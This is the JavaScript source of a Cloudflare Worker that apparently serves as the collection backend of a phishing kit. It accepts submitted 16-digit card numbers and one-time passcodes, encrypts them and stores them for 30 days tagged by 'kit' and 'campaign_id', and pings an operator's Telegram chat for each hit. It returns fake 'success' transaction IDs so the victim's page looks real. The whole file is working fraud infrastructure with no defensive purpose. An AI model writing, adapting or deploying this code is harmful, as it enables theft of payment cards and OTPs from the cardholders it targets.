/**
 * FEDJAJ — Cloudflare Worker collector (production edge).
 * Uses the NATIVE KV binding (env.KV) — no REST API, no extra credentials.
 *
 * Bindings (all present in deployed worker settings):
 *   KV - kv_namespace dba9293f104a4474959a909e27777046 (from wrangler.toml)
 *   CF_RAW_KEY, TG_BOT_TOKEN, TG_CHAT_ID - secrets (persist across deploys)
 */

const RATE_LIMIT = 5;
const RATE_WINDOW_MS = 60000;
const OTP_TTL_MS = 300000;

function hexToBuf(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  return bytes;
}

function bufToBase64(buf) {
  let binary = '';
  for (let i = 0; i < buf.byteLength; i++) binary += String.fromCharCode(buf[i]);
  return btoa(binary);
}

async function kvGet(env, key) {
  const v = await env.KV.get(key);
  return v === null || v === undefined ? null : v;
}

async function kvPut(env, key, value, expirationTtl) {
  const body = typeof value === 'string' ? value : JSON.stringify(value);
  const opts = expirationTtl ? { expirationTtl } : {};
  await env.KV.put(key, body, opts);
}

async function getRateKey(env, ip) {
  const now = Date.now();
  const key = `rl:${ip}`;
  const raw = await kvGet(env, key);
  if (!raw) return { count: 0, reset: now + RATE_WINDOW_MS };
  const d = JSON.parse(raw);
  if (now - d.ts > RATE_WINDOW_MS) return { count: 0, reset: now + RATE_WINDOW_MS };
  return d;
}

async function incrRate(env, ip) {
  const key = `rl:${ip}`;
  const d = await getRateKey(env, ip);
  d.count++;
  d.ts = Date.now();
  await kvPut(env, key, d, Math.ceil(RATE_WINDOW_MS / 1000) + 60);
  return d.count;
}

async function seenOtp(env, otp) {
  const key = `otp:${otp}`;
  const existing = await kvGet(env, key);
  if (existing) return true;
  await kvPut(env, key, '1', Math.ceil(OTP_TTL_MS / 1000) + 60);
  return false;
}

async function sendTelegram(env, msg) {
  const TG_BOT = env.TG_BOT_TOKEN;
  const TG_CHAT = env.TG_CHAT_ID;
  if (!TG_BOT || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
    });
  } catch (e) { /* silent */ }
}

function ghostTx() {
  const hex = 'BMB-' + Array.from(crypto.getRandomValues(new Uint8Array(3)))
    .map(b => b.toString(16).padStart(2, '0').toUpperCase()).join('');
  return { status: 'success', tx: hex };
}

async function handleRequest(request, env, ctx) {
  const url = new URL(request.url);
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const method = request.method;

  // CORS preflight
  if (method === 'OPTIONS') {
    return new Response(null, {
      headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'POST,GET,OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' }
    });
  }

  if (method === 'GET' && url.pathname === '/health') {
    return new Response(JSON.stringify({ status: 'running', mode: 'edge' }), {
      headers: { 'Content-Type': 'application/json' }
    });
  }

  if (method === 'POST' && url.pathname === '/beacon') {
    try {
      const body = await request.json().catch(() => ({}));
      body.received_at = Date.now();
      body.ip = ip;
      return json(ghostTx());
    } catch (e) { return json({ status: 'error' }, 400); }
  }

  if (method === 'POST' && url.pathname === '/submit') {
    // Rate limit
    const rl = await getRateKey(env, ip);
    if (rl.count >= RATE_LIMIT) {
      await sendTelegram(env, `🚫 RATE LIMITED IP: ${ip}`);
      return json({ status: 'error', code: 'rate_limited' }, 429);
    }
    await incrRate(env, ip);

    let data;
    try { data = await request.json(); } catch (e) { return json({ error: 'invalid json' }, 400); }

    // Replay guard
    const otp = String(data.otp || '');
    if (await seenOtp(env, otp)) {
      await sendTelegram(env, `🔁 REPLAY ATTEMPT OTP:${otp} IP:${ip}`);
      return json({ status: 'error', code: 'replay' }, 409);
    }

    const card = String(data.card || '').replace(/\D/g, '');
    if (card.length !== 16) return json({ status: 'error', code: 'bad_card' }, 400);

    // Encrypt submission
    const keyBytes = hexToBuf(env.CF_RAW_KEY || '');
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encoder = new TextEncoder();
    const encoded = encoder.encode(JSON.stringify(data));
    const cryptoKey = await crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, false, ['encrypt']);
    const cipher = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, cryptoKey, encoded);
    const ctBuf = new Uint8Array(cipher, 0, cipher.byteLength - 16);
    const tagBuf = new Uint8Array(cipher, cipher.byteLength - 16, 16);
    const payload = { iv: bufToBase64(iv), tag: bufToBase64(tagBuf), data: bufToBase64(ctBuf) };
    const rawId = crypto.randomUUID();

    await kvPut(env, `sub:${rawId}`, JSON.stringify(payload), 2592000);

    // Metadata
    const meta = {
      id: rawId, ts: Date.now(), ip, kit: data.kit || 'unknown',
      campaign_id: data.campaign_id || 'unknown',
      fields: ['card', 'otp'],
      tx: ghostTx().tx
    };
    await kvPut(env, `meta:${rawId}`, JSON.stringify(meta), 2592000);

    // Telegram alert
    await sendTelegram(env, `✅ TXN ${meta.tx}\ncard: ****${card.slice(-4)}\nOTP: ✅\nkit: ${meta.kit}\ncamp: ${meta.campaign_id}`);

    return json(ghostTx());
  }

  return json({ error: 'not found' }, 404);
}

function hexToBuf(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  return bytes;
}

function bufToBase64(buf) {
  let binary = '';
  for (let i = 0; i < buf.byteLength; i++) binary += String.fromCharCode(buf[i]);
  return btoa(binary);
}

function json(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}

// Modules format — wrangler passes env (bindings) as the 2nd argument.
// (Service-worker format injects bindings as globals and event.env is undefined.)
export default {
  async fetch(request, env, ctx) {
    return handleRequest(request, env, ctx);
  }
};